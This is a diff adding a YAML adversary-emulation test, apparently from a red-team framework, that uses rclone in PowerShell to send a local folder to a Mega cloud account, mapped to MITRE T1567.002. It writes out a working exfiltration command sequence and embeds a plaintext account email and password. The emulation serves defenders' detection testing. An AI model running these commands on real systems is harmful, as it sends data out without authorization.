@@ -1,0 +1,55 @@
+api_version: "2.0"
+name: Exfiltrate data with rclone to cloud Storage - Mega (Windows)
+description: |
+    This test uses rclone to exfiltrate data to a remote cloud storage instance. (Mega)
+    See https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/
+args:
+    - name: dir_to_copy
+      type: string
+      default: PathToAtomicsFolder\..\ExternalPayloads\T1567.002
+    - name: mega_user_account
+      type: string
+      default: atomictesting@outlook.com
+    - name: mega_user_password
+      type: string
+      default: vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA
+    - name: remote_share
+      type: string
+      default: T1567002
+    - name: rclone_path
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\T1567.002\rclone-v*\
+    - name: rclone_config_path
+      type: path
+      default: $env:appdata
+uuid: 8529ee44-279a-4a19-80bf-b846a40dda58
+mitre:
+    tactics:
+        - 'TA0010: Exfiltration'
+    techniques:
+        - 'T1567: Exfiltration Over Web Service'
+    subtechniques:
+        - 'T1567.002: Exfiltration to Cloud Storage'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: exfiltrate-data-with-rclone-to-cloud-storage---mega-(windows)
+      inline: |
+        New-Item {{.Args.rclone_config_path}}\rclone -ItemType directory
+        New-Item {{.Args.rclone_config_path}}\rclone\rclone.conf
+        cd "{{.Args.rclone_path}}"
+        .\rclone.exe config create {{.Args.remote_share}} mega
+        set-Content {{.Args.rclone_config_path}}\rclone\rclone.conf "[{{.Args.remote_share}}] `n type = mega `n user = {{.Args.mega_user_account}} `n pass = {{.Args.mega_user_password}}"
+        .\rclone.exe copy --max-size 1700k "{{.Args.dir_to_copy}}" {{.Args.remote_share}}:test -v
+      executor: powershell
+      cleanup:
+        inline: |
+            cd "{{.Args.rclone_path}}"
+            .\rclone.exe purge {{.Args.remote_share}}:test
+            .\rclone.exe config delete {{.Args.remote_share}}:
+            Remove-Item {{.Args.rclone_config_path}}\rclone -recurse -force -erroraction silentlycontinue
+            cd c:\
+            Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\rclone.zip"
+            Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\T1567.002" -recurse -force
+        executor: powershell
